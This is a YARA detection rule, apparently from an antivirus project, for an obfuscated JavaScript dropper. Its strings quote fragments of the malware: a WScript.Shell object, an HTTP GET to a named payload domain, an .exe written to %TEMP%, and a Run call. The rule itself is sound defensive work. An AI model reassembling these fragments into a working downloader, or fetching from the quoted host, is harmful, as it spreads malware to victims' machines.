rule sig_20160329_78e7cb2ba660fd14cb885e5a6872ccf5 {
  meta:
    description = "datamaliciousorder - file 20160329_78e7cb2ba660fd14cb885e5a6872ccf5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b74c2f03996211abb861a56150b79328522296fa4dbde336cde6b43a8a2d11c9"

  strings:
    $s1  = "function Pazvewkys() {return Swnwbzfxyi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PVFQ6ddK1I3.exe\";};" fullword ascii
    $s2  = "Rgnjanr[Hdvoy](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Jmpcnmrj](Vkpjpy() * 11)} while (Rgnjanr[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Swnwbzfxyi = function Gibtrt() {return WScript[Tlqohaw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hexbe(Fprlgblq, Glzjihfg){return Fprlgblq - Glzjihfg;};" fullword ascii
    $s6  = "function Uxepdcygl() {return ((Yghlzsex == true) && (Yghlzsex == Seqkim)) ? 1 : Qijntm;};" fullword ascii
    $s7  = "function Tdswvmmjx(Oiyuwjisz){Swnwbzfxyi[\"Run\"](Oiyuwjisz, Qijntm, Qijntm);};" fullword ascii
    $s8  = "Seqkim = true; " fullword ascii
    $s9  = "function Vkpjpy(){return 22;};" fullword ascii
    $s10 = "var Yghlzsex = false;" fullword ascii
    $s11 = "var Sjigkpsku = new this[\"Date\"]();" fullword ascii
    $s12 = "return Hexbe(Hprzxiinf, Waymh);" fullword ascii
    $s13 = "function Bilvbknp()" fullword ascii
    $s14 = " while (Dnhgnq){" fullword ascii
    $s15 = "var Qbhvxeydv = false;" fullword ascii
    $s16 = "function Retoq(){return Tlqohaw;};" fullword ascii
    $s17 = "function Oqfykedaa(){return Dwohicfrh;};" fullword ascii
    $s18 = "Yghlzsex = true; " fullword ascii
    $s19 = "function Ejlhckbwde(Buxhd) {var Ibcdonivtg = (1, 2, 3, 4, 5, Buxhd); return Ibcdonivtg;};" fullword ascii
    $s20 = "var Seqkim = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}